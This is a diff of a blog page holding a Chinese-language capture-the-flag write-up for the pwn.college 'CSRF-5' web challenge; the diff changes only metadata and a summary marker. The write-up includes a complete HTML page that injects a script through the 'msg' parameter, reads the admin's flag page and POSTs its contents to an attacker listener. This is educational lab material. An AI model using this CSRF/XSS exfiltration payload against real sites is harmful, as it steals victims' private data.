@@ -6,15 +6,15 @@
   
   <title>CSRF-5 | 0x4A</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="题目简介这一关将不允许通过Javascript获取cookie，因为服务端对cookie设置了HTTPonly属性，该设置仅允许通过http请求传送cookie值，因此XSS将无法再获得admin的cookie但是依然可以通过CSRF伪造admin用户的请求以泄露flag 漏洞点分析依然是admin账户下面有flag，而ephemeral依然接收一个msg查询字符串，所以思路就是利用这个msg把a">
+  <meta name="description" content="题目简介这一关将不允许通过Javascript获取cookie，因为服务端对cookie设置了HTTPonly属性，该设置仅允许通过http请求传送cookie值，因此XSS将无法再获得admin的cookie但是依然可以通过CSRF伪造admin用户的请求以泄露flag">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CSRF-5">
 <meta property="og:url" content="http://0x4a-210.github.io/2025/07/18/pwn.college-Wp/Intro-to-Cybersecurity/Web/CSRF-5/index.html">
 <meta property="og:site_name" content="0x4A">
-<meta property="og:description" content="题目简介这一关将不允许通过Javascript获取cookie，因为服务端对cookie设置了HTTPonly属性，该设置仅允许通过http请求传送cookie值，因此XSS将无法再获得admin的cookie但是依然可以通过CSRF伪造admin用户的请求以泄露flag 漏洞点分析依然是admin账户下面有flag，而ephemeral依然接收一个msg查询字符串，所以思路就是利用这个msg把a">
+<meta property="og:description" content="题目简介这一关将不允许通过Javascript获取cookie，因为服务端对cookie设置了HTTPonly属性，该设置仅允许通过http请求传送cookie值，因此XSS将无法再获得admin的cookie但是依然可以通过CSRF伪造admin用户的请求以泄露flag">
 <meta property="og:locale">
 <meta property="article:published_time" content="2025-07-18T01:07:38.000Z">
-<meta property="article:modified_time" content="2025-07-18T01:43:11.817Z">
+<meta property="article:modified_time" content="2025-07-18T01:51:10.473Z">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternate" href="/atom.xml" title="0x4A" type="application/atom+xml">
@@ -95,6 +95,8 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>这一关将不允许通过Javascript获取cookie，因为服务端对cookie设置了HTTPonly属性，该设置仅允许通过http请求传送cookie值，因此XSS将无法再获得admin的cookie<br><br>但是依然可以通过CSRF伪造admin用户的请求以泄露flag</p>
+<span id="more"></span>
+
 <h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>依然是admin账户下面有flag，而ephemeral依然接收一个msg查询字符串，所以思路就是利用这个msg把admin导向首页，再把请求体发给我们的服务器</p>
 <h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>如下index.html：<br></p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	    <span class="keyword">var</span> targetURL = <span class="string">&#x27;http://challenge.localhost/ephemeral?msg=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(<span class="string">&#x27;&lt;script&gt;fetch(&quot;http://challenge.localhost/&quot;).then(response=&gt;response.text()).then(flag=&gt;fetch(&quot;http://localhost:12345&quot;,&#123;method:&quot;POST&quot;,body:flag&#125;))&lt;\/script&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">       <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = targetURL;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -103,7 +105,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://0x4a-210.github.io/2025/07/18/pwn.college-Wp/Intro-to-Cybersecurity/Web/CSRF-5/" data-id="cmd85obpz0005rovf14btc81r" data-title="CSRF-5" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      <a data-url="http://0x4a-210.github.io/2025/07/18/pwn.college-Wp/Intro-to-Cybersecurity/Web/CSRF-5/" data-id="cmd85xzcx00042svfg58fdl28" data-title="CSRF-5" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
       
       
       
